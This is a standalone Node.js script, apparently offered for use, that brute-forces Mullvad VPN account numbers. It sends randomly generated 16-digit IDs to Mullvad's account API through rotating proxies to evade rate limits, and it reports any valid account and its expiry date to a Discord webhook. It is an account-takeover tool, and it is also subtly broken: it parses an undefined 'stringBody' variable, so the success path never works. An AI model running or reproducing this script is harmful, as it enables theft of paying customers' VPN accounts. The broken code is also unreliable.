process.on('uncaughtException', (err) => { }); // Ignore ECONNRESET and other request errors
process.on('unhandledRejection', (err) => { }); // Ignore ECONNRESET and other request errors

// Import modules

const request = require(`request`)
const fs = require(`fs`)

if (!fs.existsSync(`./proxies.txt`)) return console.log(`proxies.txt does not exists, please check it and try again`) // proxy file check
let proxies = fs.readFileSync(`./proxies.txt`, 'utf-8').replace(/\r/g, '').split('\n');
if (!proxies) return console.log(`there are 0 proxies, please check your proxy file`) // proxy file check

const webhookurl = `` // Your webhook url to send logs right in discord
let intervalms = 0 // interval in milliseconds (The smaller the faster)
const logerrors = true // if true then it will print error messages

if (!webhookurl) {
    return console.log(`Please check your webhook url and try again.`)
}

function log(message) { // Send log using webhookurl
    request.post({ url: webhookurl, form: { content: message } }, function (e, r, b) {
        console.log(e)
        console.log(b)
    });
}

let total = 0

function start() {
    console.clear()
    setInterval(() => {
        let geted = Math.floor(Math.random() * (9999999999999999 - 1000000000000000)) + 1000000000000000
        let taked = proxies[Math.floor(Math.random() * proxies.length)] // get a random proxy from the file
        request({
            url: `https://api.mullvad.net/www/accounts/${geted}/`,
            proxy: `https://${taked}/`
        }, function (e, r, b) {
            if (e) {
                total++
                if (logerrors) return console.log(`${e} at ${taked}`)
                return process.title = `mullvad brute | ${total} total checked`
            }
            try {
                let s = JSON.parse(stringBody)
                if (!s.account) {
                    if (logerrors) console.log(`${s.code} at ${geted}`)
                    return process.title = `mullvad brute | ${total} total checked`
                }
                if (s.account) return log(`Posible account founded. Check it:\n ${geted}\n expiration date: ${s.account.expires}`) // log if valid
            } catch (err) {
                if (logerrors) return console.log(`503 at ${taked}`)
            }
        })
    }, intervalms);

}

start()